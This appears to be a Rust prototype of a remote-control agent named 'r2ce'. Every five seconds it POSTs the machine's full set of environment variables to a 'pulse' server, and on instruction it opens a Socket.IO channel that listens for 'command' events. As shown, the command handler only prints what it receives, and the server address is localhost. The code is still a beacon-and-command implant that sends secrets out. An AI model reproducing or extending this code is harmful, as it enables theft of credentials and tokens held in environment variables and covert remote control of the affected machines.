use rust_socketio::{Payload, Socket, SocketBuilder};
use std::{
    collections::HashMap,
    env, str,
    sync::{Arc, RwLock},
};
use tokio::time;

const PULSE_URL: &str = "http://localhost:6022/pulse";
const SOCKET_URL: &str = "http://localhost:6022/socket";

#[derive(Default)]
struct ConnectionState {
    pub is_socket_active: bool,
    pub will_connect: bool,
    will_disconnect: bool,
}

impl ConnectionState {
    pub fn instance() -> Arc<ConnectionState> {
        INSTANCE_CONNECTION_STATE.with(|c| c.read().unwrap().clone())
    }
    pub fn set(self) {
        INSTANCE_CONNECTION_STATE.with(|c| *c.write().unwrap() = Arc::new(self))
    }
}

thread_local! {
    static INSTANCE_CONNECTION_STATE: RwLock<Arc<ConnectionState>> = RwLock::new(Default::default());
}

#[tokio::main]
async fn main() {
    println!("init r2ce");

    let socket_callback = |payload: Payload, _socket: Socket| match payload {
        Payload::String(str) => println!("Received: {}", str),
        Payload::Binary(bin_data) => println!("Received bytes: {:#?}", bin_data),
    };

    let mut socket: Socket;
    let mut interval = time::interval(time::Duration::from_secs(5));

    loop {
        send_pulse_async().await;

        if !ConnectionState::instance().is_socket_active && ConnectionState::instance().will_connect
        {
            socket = SocketBuilder::new(SOCKET_URL)
                .set_namespace("/")
                .expect("illegal namespace")
                .on("command", socket_callback)
                .on("error", |err, _| eprintln!("Error: {:#?}", err))
                .connect()
                .expect("Connection failed");

            socket.emit("setActive", "DOPC").expect("setActive failed");

            ConnectionState {
                is_socket_active: true,
                will_connect: false,
                will_disconnect: false,
            }
            .set();
        }

        if ConnectionState::instance().is_socket_active
            && ConnectionState::instance().will_disconnect
        {
            ConnectionState {
                is_socket_active: false,
                will_connect: false,
                will_disconnect: false,
            }
            .set();
        }

        interval.tick().await;
    }
}

async fn send_pulse_async() {
    let payload_env: HashMap<String, String> = env::vars().collect();
    let pulse_client: reqwest::Client = reqwest::Client::new();
    let response = pulse_client
        .post(PULSE_URL)
        .json(&payload_env)
        .send()
        .await
        .unwrap();

    println!("pulse sent: {}", response.status().as_str());

    let code = response.status().as_u16();

    if code == 204 {
        return;
    }
    if code == 201 {
        let data = response.text().await.unwrap();
        println!("pulse got: {}", data);

        if data == "connect" {
            // tokio::spawn(async { create_socket_async().await })
            //     .await
            //     .unwrap();

            ConnectionState {
                is_socket_active: false,
                will_connect: true,
                will_disconnect: false,
            }
            .set();
        }

        if data == "disconnect" {
            ConnectionState {
                is_socket_active: true,
                will_connect: false,
                will_disconnect: true,
            }
            .set();
        }

        return;
    }

    println!("pulse error: {}", code.to_string());
}
